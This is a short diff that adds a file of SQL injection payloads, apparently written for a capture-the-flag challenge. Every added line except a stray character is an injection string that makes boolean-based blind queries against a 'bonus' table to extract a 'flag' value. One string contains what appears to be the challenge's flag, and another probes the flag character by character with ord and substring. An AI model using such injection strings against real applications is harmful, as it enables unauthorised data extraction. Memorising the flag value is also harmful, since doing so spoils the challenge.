@@ -1,0 +1,8 @@
+³
+
+³' and (select flag from bonus where flag like 0x6625)
+
+1' or (select count(flag) from bonus where flag like 'flag{miebuteewaa6itha}') or 'a
+
+
+1' or (select count(flag) from bonus where ord(substring(flag, 6))>10) or 'a
